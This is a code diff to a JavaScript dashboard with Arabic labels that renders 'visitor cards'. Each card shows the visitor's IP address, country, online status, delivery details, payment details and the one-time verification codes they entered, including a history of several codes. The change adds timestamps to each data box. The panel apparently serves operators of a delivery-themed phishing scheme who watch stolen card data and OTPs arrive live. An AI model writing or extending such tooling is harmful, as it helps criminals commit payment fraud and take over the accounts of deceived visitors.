@@ -1086,6 +1086,12 @@ function createVisitorCard(visitor, isTrashMode = false) {
   const sessionId = visitor.session_id || 'unknown';
   const countryCode = visitor.country_code || '';
   const ipAddress = visitor.ip_address || '';
+
+  // Get timestamps for each data type
+  const createdAt = visitor.created_at || null;
+  const deliveryTime = visitor.delivery_time || null;
+  const paymentTime = visitor.payment_time || null;
+  const verificationTime = visitor.verification_time || null;
   
   // Get OTP value
   const otpValue = verification.otp || verification.verificationData?.otp || '';
@@ -1274,6 +1280,9 @@ function createVisitorCard(visitor, isTrashMode = false) {
           <span class="online-status ${isOnline ? 'online' : 'offline'}">
             ${isOnline ? '●' : '○'} ${isOnline ? 'متصل' : 'غير متصل'}
           </span>
+          <span class="visit-time" style="font-size:10px;color:#9ca3af;margin-right:8px;">
+            🕐 ${createdAt ? formatTimeAgo(new Date(createdAt)) : 'الآن'}
+          </span>
         </div>
         <div class="header-right">
           <span class="page-badge" style="background: ${pageInfo.bg};">
@@ -1290,6 +1299,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
           <div class="box-header" style="background: rgba(0, 0, 0, 0.22); border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
             <span class="box-icon">📦</span>
             <span class="box-title">بيانات التوصيل</span>
+            ${deliveryTime ? '<span class="data-time" style="font-size:10px;color:#9ca3af;margin-right:6px;">🕐 ' + formatTimeAgo(new Date(deliveryTime)) + '</span>' : ''}
           </div>
           <div class="box-content">
             ${deliveryFields.length > 0 ? deliveryRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
@@ -1302,6 +1312,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
           <div class="box-header" style="background: rgba(0, 0, 0, 0.22); border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
             <span class="box-icon">💳</span>
             <span class="box-title">بيانات الدفع</span>
+            ${paymentTime ? '<span class="data-time" style="font-size:10px;color:#9ca3af;margin-right:6px;">🕐 ' + formatTimeAgo(new Date(paymentTime)) + '</span>' : ''}
           </div>
           <div class="box-content">
             ${paymentFields.length > 0 ? paymentRowsHTML : '<div class="no-data">لا توجد بيانات</div>'}
@@ -1315,6 +1326,7 @@ function createVisitorCard(visitor, isTrashMode = false) {
         <div class="otp-header" onclick="toggleOtpHistory('${sessionId}')">
           <span class="otp-icon">🔐</span>
           <span class="otp-title">رمز التحقق (OTP)</span>
+          ${verificationTime ? '<span class="data-time" style="font-size:10px;color:#9ca3af;margin-right:6px;">🕐 ' + formatTimeAgo(new Date(verificationTime)) + '</span>' : ''}
           ${otpHistory && otpHistory.length > 1 ? `<span class="otp-count">${otpHistory.length} رمز</span>` : ''}
         </div>
         <div class="otp-display">
